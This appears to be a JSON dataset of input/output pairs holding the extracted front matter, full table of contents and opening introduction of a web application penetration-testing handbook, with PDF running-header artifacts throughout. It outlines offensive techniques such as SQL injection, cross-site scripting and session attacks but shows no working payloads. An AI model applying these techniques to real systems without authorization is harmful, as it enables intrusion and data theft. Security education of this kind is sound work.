[
  {
    "input": "The Web Application Hacker’s Handbook",
    "output": "Stuttard ffi rs.indd V4 - 08/17/2011 Page i\nThe Web Application\nHacker’s Handbook\nSecond Edition\nFinding and Exploiting Security Flaws\nDafydd Stuttard\nMarcus Pinto\nffffiirrss..iinndddd ii 88//1199//22001111 1122::2222::3333 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page ii\nThe Web Application Hacker’s Handbook: Finding and Exploiting Security Flaws, Second Edition\nPublished by\nJohn Wiley & Sons, Inc.\n10475 Crosspoint Boulevard\nIndianapolis, IN 46256\nwww.wiley.com\nCopyright © 2011 by Dafydd Stuttard and Marcus Pinto\nPublished by John Wiley & Sons, Inc., Indianapolis, Indiana\nPublished simultaneously in Canada\nISBN: 978-1-118-02647-2\nISBN: 978-1-118-17522-4 (ebk)\nISBN: 978-1-118-17524-8 (ebk)\nISBN: 978-1-118-17523-1 (ebk)\nManufactured in the United States of America\n10 9 8 7 6 5 4 3 2 1\nNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or\nby any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permitted\nunder Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permis-\nsion of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright\nClearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the\nPublisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111\nRiver Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at http://www.wiley.\ncom/go/permissions.\nLimit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or war-\nranties with respect to the accuracy or completeness of the contents of this work and specifi cally disclaim all\nwarranties, including without limitation warranties of fi tness for a particular purpose. No warranty may be\ncreated or extended by sales or promotional materials. The advice and strategies contained herein may not\nbe suitable for every situation. This work is sold with the understanding that the publisher is not engaged in\nrendering legal, accounting, or other professional services. If professional assistance is required, the services\nof a competent professional person should be sought. Neither the publisher nor the author shall be liable for\ndamages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation\nand/or a potential source of further information does not mean that the author or the publisher endorses\nthe information the organization or website may provide or recommendations it may make. Further, readers\nshould be aware that Internet websites listed in this work may have changed or disappeared between when\nthis work was written and when it is read.\nFor general information on our other products and services please contact our Customer Care Department\nwithin the United States at (877) 762-2974, outside the United States at (317) 572-3993 or fax (317) 572-4002.\nWiley also publishes its books in a variety of electronic formats and by print-on-demand. Not all content\nthat is available in standard print versions of this book may appear or be packaged in all book formats. If\nyou have purchased a version of this book that did not include media that is referenced by or accompanies\na standard print version, you may request this media by visiting http://booksupport.wiley.\ncom. For more information about Wiley products, visit us at www.wiley.com.\nLibrary of Congress Control Number: 2011934639\nTrademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc.\nand/or its affi liates, in the United States and other countries, and may not be used without written permission.\nAll other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated\nwith any product or vendor mentioned in this book.\nffffiirrss..iinndddd iiii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page iii\nAbout the Authors\nDafydd Stuttard is an independent security consultant, author, and software\ndeveloper. With more than 10 years of experience in security consulting, he\nspecializes in the penetration testing of web applications and compiled soft-\nware. Dafydd has worked with numerous banks, retailers, and other enterprises\nto help secure their web applications. He also has provided security consulting to\nseveral software manufacturers and governments to help secure their compiled\nsoftware. Dafydd is an accomplished programmer in several languages. His\ninterests include developing tools to facilitate all kinds of software security\ntesting. Under the alias “PortSwigger,” Dafydd created the popular Burp Suite\nof web application hacking tools; he continues to work actively on Burp’s devel-\nopment. Dafydd is also cofounder of MDSec, a company providing training and\nconsultancy on Internet security attack and defense. Dafydd has developed and\npresented training courses at various security conferences around the world,\nand he regularly delivers training to companies and governments. He holds\nmaster’s and doctorate degrees in philosophy from the University of Oxford.\nMarcus Pinto is cofounder of MDSec, developing and delivering training\ncourses in web application security. He also performs ongoing security con-\nsultancy for fi nancial, government, telecom, and retail verticals. His 11 years\nof experience in the industry have been dominated by the technical aspects of\napplication security, from the dual perspectives of a consulting and end-user\nimplementation role. Marcus has a background in attack-based security assess-\nment and penetration testing. He has worked extensively with large-scale web\napplication deployments in the fi nancial services industry. Marcus has been\ndeveloping and presenting database and web application training courses since\n2005 at Black Hat and other worldwide security conferences, and for private-\nsector and government clients. He holds a master’s degree in physics from the\nUniversity of Cambridge.\niii\nffffiirrss..iinndddd iiiiii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page iv\nAbout the Technical Editor\nDr. Josh Pauli received his Ph.D. in Software Engineering from North Dakota\nState University (NDSU) with an emphasis in secure requirements engineering\nand now serves as an Associate Professor of Information Security at Dakota\nState University (DSU). Dr. Pauli has published nearly 20 international jour-\nnal and conference papers related to software security and his work includes\ninvited presentations from the Department of Homeland Security and Black\nHat Briefi ngs. He teaches both undergraduate and graduate courses in system\nsoftware security and web software security at DSU. Dr. Pauli also conducts web\napplication penetration tests as a Senior Penetration Tester for an Information\nSecurity consulting fi rm where his duties include developing hands-on techni-\ncal workshops in the area of web software security for IT professionals in the\nfi nancial sector.\niv\nffffiirrss..iinndddd iivv 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page v\nMDSec: The Authors’ Company\nDafydd and Marcus are cofounders of MDSec, a company that provides training\nin attack and defense-based security, along with other consultancy services. If\nwhile reading this book you would like to put the concepts into practice, and\ngain hands-on experience in the areas covered, you are encouraged to visit our\nwebsite, http://mdsec.net. This will give you access to hundreds of interactive\nvulnerability labs and other resources that are referenced throughout the book.\nv\nffffiirrss..iinndddd vv 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page vi\nCredits\nExecutive Editor Vice President and Executive\nCarol Long Publisher\nNeil Edde\nSenior Project Editor\nAdaobi Obi Tulton Associate Publisher\nJim Minatel\nTechnical Editor\nJosh Pauli Project Coordinator, Cover\nKatie Crocker\nProduction Editor\nKathleen Wisor Proofreaders\nSarah Kaikini, Word One\nCopy Editor\nSheilah Ledwidge, Word One\nGayle Johnson\nIndexer\nEditorial Manager\nRobert Swanson\nMary Beth Wakefi eld\nCover Designer\nFreelancer Editorial Manager\nRyan Sneed\nRosemarie Graham\nCover Image\nAssociate Director of\nWiley InHouse Design\nMarketing\nDavid Mayhew Vertical Websites Project Manager\nLaura Moss-Hollister\nMarketing Manager\nAshley Zurcher Vertical Websites Assistant Project\nManager\nBusiness Manager\nJenny Swisher\nAmy Knies\nVertical Websites Associate\nProduction Manager\nProducers\nTim Tate\nJosh Frank\nVice President and Executive Shawn Patrick\nGroup Publisher Doug Kuhn\nRichard Swadley Marilyn Hummel\nvi\nffffiirrss..iinndddd vvii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page vii\nAcknowledgments\nWe are indebted to the directors and others at Next Generation Security Software,\nwho provided the right environment for us to realize the fi rst edition of this\nbook. Since then, our input has come from an increasingly wider community\nof researchers and professionals who have shared their ideas and contributed\nto the collective understanding of web application security issues that exists\ntoday. Because this is a practical handbook rather than a work of scholarship,\nwe have deliberately avoided fi lling it with a thousand citations of infl uential\narticles, books, and blog postings that spawned the ideas involved. We hope\nthat people whose work we discuss anonymously are content with the general\ncredit given here.\nWe are grateful to the people at Wiley — in particular, to Carol Long for\nenthusiastically supporting our project from the outset, to Adaobi Obi Tulton\nfor helping polish our manuscript and coaching us in the quirks of “American\nEnglish,” to Gayle Johnson for her very helpful and attentive copy editing, and\nto Katie Wisor’s team for delivering a fi rst-rate production.\nA large measure of thanks is due to our respective partners, Becky and Amanda,\nfor tolerating the signifi cant distraction and time involved in producing a book\nof this size.\nBoth authors are indebted to the people who led us into our unusual line\nof work. Dafydd would like to thank Martin Law. Martin is a great guy who\nfi rst taught me how to hack and encouraged me to spend my time developing\ntechniques and tools for attacking applications. Marcus would like to thank his\nparents for everything they have done and continue to do, including getting me\ninto computers. I’ve been getting into computers ever since.\nvii\nffffiirrss..iinndddd vviiii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page viii\nContents at a Glance\nIntroduction xxiii\nChapter 1 Web Application (In)security 1\nChapter 2 Core Defense Mechanisms 17\nChapter 3 Web Application Technologies 39\nChapter 4 Mapping the Application 73\nChapter 5 Bypassing Client-Side Controls 117\nChapter 6 Attacking Authentication 159\nChapter 7 Attacking Session Management 205\nChapter 8 Attacking Access Controls 257\nChapter 9 Attacking Data Stores 287\nChapter 10 Attacking Back-End Components 357\nChapter 11 Attacking Application Logic 405\nChapter 12 Attacking Users: Cross-Site Scripting 431\nChapter 13 Attacking Users: Other Techniques 501\nChapter 14 Automating Customized Attacks 571\nChapter 15 Exploiting Information Disclosure 615\nChapter 16 Attacking Native Compiled Applications 633\nChapter 17 Attacking Application Architecture 647\nChapter 18 Attacking the Application Server 669\nChapter 19 Finding Vulnerabilities in Source Code 701\nChapter 20 A Web Application Hacker’s Toolkit 747\nChapter 21 A Web Application Hacker’s Methodology 791\nIndex 853\nviii\nffffiirrss..iinndddd vviiiiii 88//1199//22001111 1122::2222::3388 PPMM"
  },
  {
    "input": "Contents",
    "output": "Stuttard ftoc.indd V2 - 08/10/2011 Page ix\nContents\nIntroduction xxiii\nChapter 1 Web Application (In)security 1\nThe Evolution of Web Applications 2\nCommon Web Application Functions 4\nBenefi ts of Web Applications 5\nWeb Application Security 6\n“This Site Is Secure” 7\nThe Core Security Problem: Users Can Submit\nArbitrary Input 9\nKey Problem Factors 10\nThe New Security Perimeter 12\nThe Future of Web Application Security 14\nSummary 15\nChapter 2 Core Defense Mechanisms 17\nHandling User Access 18\nAuthentication 18\nSession Management 19\nAccess Control 20\nHandling User Input 21\nVarieties of Input 21\nApproaches to Input Handling 23\nBoundary Validation 25\nMultistep Validation and Canonicalization 28\nHandling Attackers 30\nHandling Errors 30\nMaintaining Audit Logs 31\nAlerting Administrators 33\nReacting to Attacks 34\nix\nffttoocc..iinndddd iixx 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page x\nx Contents\nManaging the Application 35\nSummary 36\nQuestions 36\nChapter 3 Web Application Technologies 39\nThe HTTP Protocol 39\nHTTP Requests 40\nHTTP Responses 41\nHTTP Methods 42\nURLs 44\nREST 44\nHTTP Headers 45\nCookies 47\nStatus Codes 48\nHTTPS 49\nHTTP Proxies 49\nHTTP Authentication 50\nWeb Functionality 51\nServer-Side Functionality 51\nClient-Side Functionality 57\nState and Sessions 66\nEncoding Schemes 66\nURL Encoding 67\nUnicode Encoding 67\nHTML Encoding 68\nBase64 Encoding 69\nHex Encoding 69\nRemoting and Serialization\nFrameworks 70\nNext Steps 70\nQuestions 71\nChapter 4 Mapping the Application 73\nEnumerating Content and Functionality 74\nWeb Spidering 74\nUser-Directed Spidering 77\nDiscovering Hidden Content 80\nApplication Pages Versus\nFunctional Paths 93\nDiscovering Hidden Parameters 96\nAnalyzing the Application 97\nIdentifying Entry Points for User Input 98\nIdentifying Server-Side Technologies 101\nIdentifying Server-Side Functionality 107\nMapping the Attack Surface 111\nSummary 114\nQuestions 114\nffttoocc..iinndddd xx 88//1199//22001111 1122::2233::3355 PPMM\nx Stuttard ftoc.indd V2 - 08/10/2011 Page xi\nContents xi\nChapter 5 Bypassing Client-Side Controls 117\nTransmitting Data Via the Client 118\nHidden Form Fields 118\nHTTP Cookies 121\nURL Parameters 121\nThe Referer Header 122\nOpaque Data 123\nThe ASP.NET ViewState 124\nCapturing User Data: HTML Forms 127\nLength Limits 128\nScript-Based Validation 129\nDisabled Elements 131\nCapturing User Data: Browser Extensions 133\nCommon Browser Extension Technologies 134\nApproaches to Browser Extensions 135\nIntercepting Traffi c from Browser Extensions 135\nDecompiling Browser Extensions 139\nAttaching a Debugger 151\nNative Client Components 153\nHandling Client-Side Data Securely 154\nTransmitting Data Via the Client 154\nValidating Client-Generated Data 155\nLogging and Alerting 156\nSummary 156\nQuestions 157\nChapter 6 Attacking Authentication 159\nAuthentication Technologies 160\nDesign Flaws in Authentication\nMechanisms 161\nBad Passwords 161\nBrute-Forcible Login 162\nVerbose Failure Messages 166\nVulnerable Transmission of Credentials 169\nPassword Change Functionality 171\nForgotten Password Functionality 173\n“Remember Me” Functionality 176\nUser Impersonation Functionality 178\nIncomplete Validation of Credentials 180\nNonunique Usernames 181\nPredictable Usernames 182\nPredictable Initial Passwords 183\nInsecure Distribution of Credentials 184\nImplementation Flaws in Authentication 185\nFail-Open Login Mechanisms 185\nDefects in Multistage Login Mechanisms 186\nInsecure Storage of Credentials 190\nffttoocc..iinndddd xxii 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xii\nxii Contents\nSecuring Authentication 191\nUse Strong Credentials 192\nHandle Credentials Secretively 192\nValidate Credentials Properly 193\nPrevent Information Leakage 195\nPrevent Brute-Force Attacks 196\nPrevent Misuse of the Password Change Function 199\nPrevent Misuse of the Account Recovery Function 199\nLog, Monitor, and Notify 201\nSummary 201\nQuestions 202\nChapter 7 Attacking Session Management 205\nThe Need for State 206\nAlternatives to Sessions 208\nWeaknesses in Token Generation 210\nMeaningful Tokens 210\nPredictable Tokens 213\nEncrypted Tokens 223\nWeaknesses in Session Token Handling 233\nDisclosure of Tokens on the Network 234\nDisclosure of Tokens in Logs 237\nVulnerable Mapping of Tokens to Sessions 240\nVulnerable Session Termination 241\nClient Exposure to Token Hijacking 243\nLiberal Cookie Scope 244\nSecuring Session Management 248\nGenerate Strong Tokens 248\nProtect Tokens Throughout Their Life Cycle 250\nLog, Monitor, and Alert 253\nSummary 254\nQuestions 255\nChapter 8 Attacking Access Controls 257\nCommon Vulnerabilities 258\nCompletely Unprotected Functionality 259\nIdentifi er-Based Functions 261\nMultistage Functions 262\nStatic Files 263\nPlatform Misconfi guration 264\nInsecure Access Control Methods 265\nAttacking Access Controls 266\nTesting with Different User Accounts 267\nTesting Multistage Processes 271\nTesting with Limited Access 273\nTesting Direct Access to Methods 276\nTesting Controls Over Static Resources 277\nffttoocc..iinndddd xxiiii 88//1199//22001111 1122::2233::3355 PPMM\nxii Stuttard ftoc.indd V2 - 08/10/2011 Page xiii\nContents xiii\nTesting Restrictions on HTTP Methods 278\nSecuring Access Controls 278\nA Multilayered Privilege Model 280\nSummary 284\nQuestions 284\nChapter 9 Attacking Data Stores 287\nInjecting into Interpreted Contexts 288\nBypassing a Login 288\nInjecting into SQL 291\nExploiting a Basic Vulnerability 292\nInjecting into Different Statement Types 294\nFinding SQL Injection Bugs 298\nFingerprinting the Database 303\nThe UNION Operator 304\nExtracting Useful Data 308\nExtracting Data with UNION 308\nBypassing Filters 311\nSecond-Order SQL Injection 313\nAdvanced Exploitation 314\nBeyond SQL Injection: Escalating the\nDatabase Attack 325\nUsing SQL Exploitation Tools 328\nSQL Syntax and Error Reference 332\nPreventing SQL Injection 338\nInjecting into NoSQL 342\nInjecting into MongoDB 343\nInjecting into XPath 344\nSubverting Application Logic 345\nInformed XPath Injection 346\nBlind XPath Injection 347\nFinding XPath Injection Flaws 348\nPreventing XPath Injection 349\nInjecting into LDAP 349\nExploiting LDAP Injection 351\nFinding LDAP Injection Flaws 353\nPreventing LDAP Injection 354\nSummary 354\nQuestions 354\nChapter 10 Attacking Back-End Components 357\nInjecting OS Commands 358\nExample 1: Injecting Via Perl 358\nExample 2: Injecting Via ASP 360\nInjecting Through Dynamic Execution 362\nFinding OS Command Injection Flaws 363\nFinding Dynamic Execution Vulnerabilities 366\nffttoocc..iinndddd xxiiiiii 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xiv\nxiv Contents\nPreventing OS Command Injection 367\nPreventing Script Injection Vulnerabilities 368\nManipulating File Paths 368\nPath Traversal Vulnerabilities 368\nFile Inclusion Vulnerabilities 381\nInjecting into XML Interpreters 383\nInjecting XML External Entities 384\nInjecting into SOAP Services 386\nFinding and Exploiting SOAP Injection 389\nPreventing SOAP Injection 390\nInjecting into Back-end HTTP Requests 390\nServer-side HTTP Redirection 390\nHTTP Parameter Injection 393\nInjecting into Mail Services 397\nE-mail Header Manipulation 398\nSMTP Command Injection 399\nFinding SMTP Injection Flaws 400\nPreventing SMTP Injection 402\nSummary 402\nQuestions 403\nChapter 11 Attacking Application Logic 405\nThe Nature of Logic Flaws 406\nReal-World Logic Flaws 406\nExample 1: Asking the Oracle 407\nExample 2: Fooling a Password Change Function 409\nExample 3: Proceeding to Checkout 410\nExample 4: Rolling Your Own Insurance 412\nExample 5: Breaking the Bank 414\nExample 6: Beating a Business Limit 416\nExample 7: Cheating on Bulk Discounts 418\nExample 8: Escaping from Escaping 419\nExample 9: Invalidating Input Validation 420\nExample 10: Abusing a Search Function 422\nExample 11: Snarfi ng Debug Messages 424\nExample 12: Racing Against the Login 426\nAvoiding Logic Flaws 428\nSummary 429\nQuestions 430\nChapter 12 Attacking Users: Cross-Site Scripting 431\nVarieties of XSS 433\nRefl ected XSS Vulnerabilities 434\nStored XSS Vulnerabilities 438\nDOM-Based XSS Vulnerabilities 440\nXSS Attacks in Action 442\nReal-World XSS Attacks 442\nffttoocc..iinndddd xxiivv 88//1199//22001111 1122::2233::3355 PPMM\niv Stuttard ftoc.indd V2 - 08/10/2011 Page xv\nContents xv\nPayloads for XSS Attacks 443\nDelivery Mechanisms for XSS Attacks 447\nFinding and Exploiting XSS Vulnerabilities 451\nFinding and Exploiting Refl ected XSS Vulnerabilities 452\nFinding and Exploiting Stored XSS Vulnerabilities 481\nFinding and Exploiting DOM-Based XSS Vulnerabilities 487\nPreventing XSS Attacks 492\nPreventing Refl ected and Stored XSS 492\nPreventing DOM-Based XSS 496\nSummary 498\nQuestions 498\nChapter 13 Attacking Users: Other Techniques 501\nInducing User Actions 501\nRequest Forgery 502\nUI Redress 511\nCapturing Data Cross-Domain 515\nCapturing Data by Injecting HTML 516\nCapturing Data by Injecting CSS 517\nJavaScript Hijacking 519\nThe Same-Origin Policy Revisited 524\nThe Same-Origin Policy and Browser Extensions 525\nThe Same-Origin Policy and HTML5 528\nCrossing Domains with Proxy Service Applications 529\nOther Client-Side Injection Attacks 531\nHTTP Header Injection 531\nCookie Injection 536\nOpen Redirection Vulnerabilities 540\nClient-Side SQL Injection 547\nClient-Side HTTP Parameter Pollution 548\nLocal Privacy Attacks 550\nPersistent Cookies 550\nCached Web Content 551\nBrowsing History 552\nAutocomplete 552\nFlash Local Shared Objects 553\nSilverlight Isolated Storage 553\nInternet Explorer userData 554\nHTML5 Local Storage Mechanisms 554\nPreventing Local Privacy Attacks 554\nAttacking ActiveX Controls 555\nFinding ActiveX Vulnerabilities 556\nPreventing ActiveX Vulnerabilities 558\nAttacking the Browser 559\nLogging Keystrokes 560\nStealing Browser History and Search Queries 560\nffttoocc..iinndddd xxvv 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xvi\nxvi Contents\nEnumerating Currently Used Applications 560\nPort Scanning 561\nAttacking Other Network Hosts 561\nExploiting Non-HTTP Services 562\nExploiting Browser Bugs 563\nDNS Rebinding 563\nBrowser Exploitation Frameworks 564\nMan-in-the-Middle Attacks 566\nSummary 568\nQuestions 568\nChapter 14 Automating Customized Attacks 571\nUses for Customized Automation 572\nEnumerating Valid Identifi ers 573\nThe Basic Approach 574\nDetecting Hits 574\nScripting the Attack 576\nJAttack 577\nHarvesting Useful Data 583\nFuzzing for Common Vulnerabilities 586\nPutting It All Together: Burp Intruder 590\nBarriers to Automation 602\nSession-Handling Mechanisms 602\nCAPTCHA Controls 610\nSummary 613\nQuestions 613\nChapter 15 Exploiting Information Disclosure 615\nExploiting Error Messages 615\nScript Error Messages 616\nStack Traces 617\nInformative Debug Messages 618\nServer and Database Messages 619\nUsing Public Information 623\nEngineering Informative Error Messages 624\nGathering Published Information 625\nUsing Inference 626\nPreventing Information Leakage 627\nUse Generic Error Messages 628\nProtect Sensitive Information 628\nMinimize Client-Side Information Leakage 629\nSummary 629\nQuestions 630\nChapter 16 Attacking Native Compiled Applications 633\nBuffer Overfl ow Vulnerabilities 634\nStack Overfl ows 634\nHeap Overfl ows 635\nffttoocc..iinndddd xxvvii 88//1199//22001111 1122::2233::3355 PPMM\nvi Stuttard ftoc.indd V2 - 08/10/2011 Page xvii\nContents xvii\n“Off-by-One” Vulnerabilities 636\nDetecting Buffer Overfl ow Vulnerabilities 639\nInteger Vulnerabilities 640\nInteger Overfl ows 640\nSignedness Errors 641\nDetecting Integer Vulnerabilities 642\nFormat String Vulnerabilities 643\nDetecting Format String Vulnerabilities 644\nSummary 645\nQuestions 645\nChapter 17 Attacking Application Architecture 647\nTiered Architectures 647\nAttacking Tiered Architectures 648\nSecuring Tiered Architectures 654\nShared Hosting and Application Service Providers 656\nVirtual Hosting 657\nShared Application Services 657\nAttacking Shared Environments 658\nSecuring Shared Environments 665\nSummary 667\nQuestions 667\nChapter 18 Attacking the Application Server 669\nVulnerable Server Confi guration 670\nDefault Credentials 670\nDefault Content 671\nDirectory Listings 677\nWebDAV Methods 679\nThe Application Server as a Proxy 682\nMisconfi gured Virtual Hosting 683\nSecuring Web Server Confi guration 684\nVulnerable Server Software 684\nApplication Framework Flaws 685\nMemory Management Vulnerabilities 687\nEncoding and Canonicalization 689\nFinding Web Server Flaws 694\nSecuring Web Server Software 695\nWeb Application Firewalls 697\nSummary 699\nQuestions 699\nChapter 19 Finding Vulnerabilities in Source Code 701\nApproaches to Code Review 702\nBlack-Box Versus White-Box Testing 702\nCode Review Methodology 703\nSignatures of Common Vulnerabilities 704\nCross-Site Scripting 704\nffttoocc..iinndddd xxvviiii 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xviii\nxviii Contents\nSQL Injection 705\nPath Traversal 706\nArbitrary Redirection 707\nOS Command Injection 708\nBackdoor Passwords 708\nNative Software Bugs 709\nSource Code Comments 710\nThe Java Platform 711\nIdentifying User-Supplied Data 711\nSession Interaction 712\nPotentially Dangerous APIs 713\nConfi guring the Java Environment 716\nASP.NET 718\nIdentifying User-Supplied Data 718\nSession Interaction 719\nPotentially Dangerous APIs 720\nConfi guring the ASP.NET Environment 723\nPHP 724\nIdentifying User-Supplied Data 724\nSession Interaction 727\nPotentially Dangerous APIs 727\nConfi guring the PHP Environment 732\nPerl 735\nIdentifying User-Supplied Data 735\nSession Interaction 736\nPotentially Dangerous APIs 736\nConfi guring the Perl Environment 739\nJavaScript 740\nDatabase Code Components 741\nSQL Injection 741\nCalls to Dangerous Functions 742\nTools for Code Browsing 743\nSummary 744\nQuestions 744\nChapter 20 A Web Application Hacker’s Toolkit 747\nWeb Browsers 748\nInternet Explorer 748\nFirefox 749\nChrome 750\nIntegrated Testing Suites 751\nHow the Tools Work 751\nTesting Work Flow 769\nAlternatives to the Intercepting Proxy 771\nStandalone Vulnerability Scanners 773\nVulnerabilities Detected by Scanners 774\nInherent Limitations of Scanners 776\nffttoocc..iinndddd xxvviiiiii 88//1199//22001111 1122::2233::3355 PPMM\niii Stuttard ftoc.indd V2 - 08/10/2011 Page xix\nContents xix\nTechnical Challenges Faced by Scanners 778\nCurrent Products 781\nUsing a Vulnerability Scanner 783\nOther Tools 785\nWikto/Nikto 785\nFirebug 785\nHydra 785\nCustom Scripts 786\nSummary 789\nChapter 21 A Web Application Hacker’s Methodology 791\nGeneral Guidelines 793\n1 Map the Application’s Content 795\n1.1 Explore Visible Content 795\n1.2 Consult Public Resources 796\n1.3 Discover Hidden Content 796\n1.4 Discover Default Content 797\n1.5 Enumerate Identifi er-Specifi ed Functions 797\n1.6 Test for Debug Parameters 798\n2 Analyze the Application 798\n2.1 Identify Functionality 798\n2.2 Identify Data Entry Points 799\n2.3 Identify the Technologies Used 799\n2.4 Map the Attack Surface 800\n3 Test Client-Side Controls 800\n3.1 Test Transmission of Data Via the Client 801\n3.2 Test Client-Side Controls Over User Input 801\n3.3 Test Browser Extension Components 802\n4 Test the Authentication Mechanism 805\n4.1 Understand the Mechanism 805\n4.2 Test Password Quality 806\n4.3 Test for Username Enumeration 806\n4.4 Test Resilience to Password Guessing 807\n4.5 Test Any Account Recovery Function 807\n4.6 Test Any Remember Me Function 808\n4.7 Test Any Impersonation Function 808\n4.8 Test Username Uniqueness 809\n4.9 Test Predictability of Autogenerated Credentials 809\n4.10 Check for Unsafe Transmission of Credentials 810\n4.11 Check for Unsafe Distribution of Credentials 810\n4.12 Test for Insecure Storage 811\n4.13 Test for Logic Flaws 811\n4.14 Exploit Any Vulnerabilities to Gain Unauthorized Access 813\n5 Test the Session Management Mechanism 814\n5.1 Understand the Mechanism 814\n5.2 Test Tokens for Meaning 815\n5.3 Test Tokens for Predictability 816\nffttoocc..iinndddd xxiixx 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xx\nxx Contents\n5.4 Check for Insecure Transmission of Tokens 817\n5.5 Check for Disclosure of Tokens in Logs 817\n5.6 Check Mapping of Tokens to Sessions 818\n5.7 Test Session Termination 818\n5.8 Check for Session Fixation 819\n5.9 Check for CSRF 820\n5.10 Check Cookie Scope 820\n6 Test Access Controls 821\n6.1 Understand the Access Control Requirements 821\n6.2 Test with Multiple Accounts 822\n6.3 Test with Limited Access 822\n6.4 Test for Insecure Access Control Methods 823\n7 Test for Input-Based Vulnerabilities 824\n7.1 Fuzz All Request Parameters 824\n7.2 Test for SQL Injection 827\n7.3 Test for XSS and Other Response Injection 829\n7.4 Test for OS Command Injection 832\n7.5 Test for Path Traversal 833\n7.6 Test for Script Injection 835\n7.7 Test for File Inclusion 835\n8 Test for Function-Specifi c Input Vulnerabilities 836\n8.1 Test for SMTP Injection 836\n8.2 Test for Native Software Vulnerabilities 837\n8.3 Test for SOAP Injection 839\n8.4 Test for LDAP Injection 839\n8.5 Test for XPath Injection 840\n8.6 Test for Back-End Request Injection 841\n8.7 Test for XXE Injection 841\n9 Test for Logic Flaws 842\n9.1 Identify the Key Attack Surface 842\n9.2 Test Multistage Processes 842\n9.3 Test Handling of Incomplete Input 843\n9.4 Test Trust Boundaries 844\n9.5 Test Transaction Logic 844\n10 Test for Shared Hosting Vulnerabilities 845\n10.1 Test Segregation in Shared Infrastructures 845\n10.2 Test Segregation Between ASP-Hosted Applications 845\n11 Test for Application Server Vulnerabilities 846\n11.1 Test for Default Credentials 846\n11.2 Test for Default Content 847\n11.3 Test for Dangerous HTTP Methods 847\n11.4 Test for Proxy Functionality 847\n11.5 Test for Virtual Hosting Misconfi guration 847\n11.6 Test for Web Server Software Bugs 848\n11.7 Test for Web Application Firewalling 848\nffttoocc..iinndddd xxxx 88//1199//22001111 1122::2233::3366 PPMM\nxx Stuttard ftoc.indd V2 - 08/10/2011 Page xxi\nContents xxi\n12 Miscellaneous Checks 849\n12.1 Check for DOM-Based Attacks 849\n12.2 Check for Local Privacy Vulnerabilities 850\n12.3 Check for Weak SSL Ciphers 851\n12.4 Check Same-Origin Policy Confi guration 851\n13 Follow Up Any Information Leakage 852\nIndex 853\nffttoocc..iinndddd xxxxii 88//1199//22001111 1122::2233::3366 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxii\nffllaasstt..iinndddd xxxxiiii 88//1199//22001111 1122::2233::0077 PPMM"
  },
  {
    "input": "Introduction",
    "output": "Stuttard fl ast.indd V2 - 08/10/2011 Page xxiii\nIntroduction\nThis book is a practical guide to discovering and exploiting security fl aws in\nweb applications. By “web applications” we mean those that are accessed using\na web browser to communicate with a web server. We examine a wide variety\nof different technologies, such as databases, fi le systems, and web services, but\nonly in the context in which these are employed by web applications.\nIf you want to learn how to run port scans, attack fi rewalls, or break into serv-\ners in other ways, we suggest you look elsewhere. But if you want to know how\nto hack into a web application, steal sensitive data, and perform unauthorized\nactions, this is the book for you. There is enough that is interesting and fun to\nsay on that subject without straying into any other territory.\nOverview of This Book\nThe focus of this book is highly practical. Although we include suffi cient back-\nground and theory for you to understand the vulnerabilities that web applications\ncontain, our primary concern is the tasks and techniques that you need to master\nto break into them. Throughout the book, we spell out the specifi c steps you need\nto follow to detect each type of vulnerability, and how to exploit it to perform\nunauthorized actions. We also include a wealth of real-world examples, derived\nfrom the authors’ many years of experience, illustrating how different kinds of\nsecurity fl aws manifest themselves in today’s web applications.\nSecurity awareness is usually a double-edged sword. Just as application\ndevelopers can benefi t from understanding the methods attackers use, hackers\ncan gain from knowing how applications can effectively defend themselves.\nIn addition to describing security vulnerabilities and attack techniques, we\ndescribe in detail the countermeasures that applications can take to thwart an\nxxiii\nffllaasstt..iinndddd xxxxiiiiii 88//1199//22001111 1122::2233::0077 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxiv\nxxiv Introduction\nattacker. If you perform penetration tests of web applications, this will enable\nyou to provide high-quality remediation advice to the owners of the applica-\ntions you compromise.\nWho Should Read This Book\nThis book’s primary audience is anyone who has a personal or professional\ninterest in attacking web applications. It is also aimed at anyone responsible for\ndeveloping and administering web applications. Knowing how your enemies\noperate will help you defend against them.\nWe assume that you are familiar with core security concepts such as logins\nand access controls and that you have a basic grasp of core web technologies\nsuch as browsers, web servers, and HTTP. However, any gaps in your current\nknowledge of these areas will be easy to remedy, through either the explana-\ntions contained in this book or references elsewhere.\nIn the course of illustrating many categories of security fl aws, we provide\ncode extracts showing how applications can be vulnerable. These examples are\nsimple enough that you can understand them without any prior knowledge\nof the language in question. But they are most useful if you have some basic\nexperience with reading or writing code.\nHow This Book Is Organized\nThis book is organized roughly in line with the dependencies between the dif-\nferent topics covered. If you are new to web application 